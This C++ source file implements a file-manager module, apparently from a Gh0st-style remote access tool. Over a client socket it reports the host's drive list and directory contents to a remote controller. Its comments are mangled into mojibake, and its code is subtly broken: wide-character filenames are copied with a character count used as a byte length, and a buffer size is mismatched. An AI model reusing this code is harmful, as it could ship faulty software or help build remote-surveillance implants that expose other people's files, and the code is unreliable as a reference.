#include "stdafx.h"
#include "FileManager.h"


CFileManager::CFileManager(CClientSocket *pClient,DWORD managerHandle)
	:CManager(pClient)
{


	m_managerHandle = managerHandle;
	Cmd		SendCmd;
	SendCmd.command = FILE_TOKEN_START;
	SendCmd.DialogPointer = m_managerHandle;
	
	Send((LPBYTE)&SendCmd, sizeof(Cmd));
	
	WaitForDialogOpen();

}
CFileManager::~CFileManager()
{

}
void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == BASE_TOKEN_NEXT)
	{
		NotifyDialogIsOpen();
		SendDriveList();
		return;
	}
	FILE_DATA	*pFileData;
	pFileData =(FILE_DATA*) lpBuffer;
	switch (pFileData->bToken)
	{
	case FILE_COMMAND_LIST_FILES:// ��ȡ�ļ��б�

		SendFilesList((wchar_t *)pFileData->pData);
		break;
	default:
		break;
	}
	

}

UINT CFileManager::SendDriveList()
{
	DRIVE_LIST DriveList;
	DriveList.bToken	=	FILE_TOKEN_DRIVE_LIST;
	wchar_t		DriveStr[256];
	GetLogicalDriveStrings(sizeof(DriveList.DriveString), DriveList.DriveString);
	return Send((LPBYTE)&DriveList, sizeof(DRIVE_LIST));
}

UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	UINT	nRet = 0;
	wchar_t	strPath[MAX_PATH];
	wchar_t	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // �ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	
	wsprintf(strPath, _T("%s\\*.*"), lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = FILE_TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = FILE_TOKEN_FILE_LIST;
	
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		// ��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (lstrcmp(pszFileName, _T(".")) == 0 || lstrcmp(pszFileName, _T("..")) == 0)
			continue;
		// �ļ����� 1 �ֽ�
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// �ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}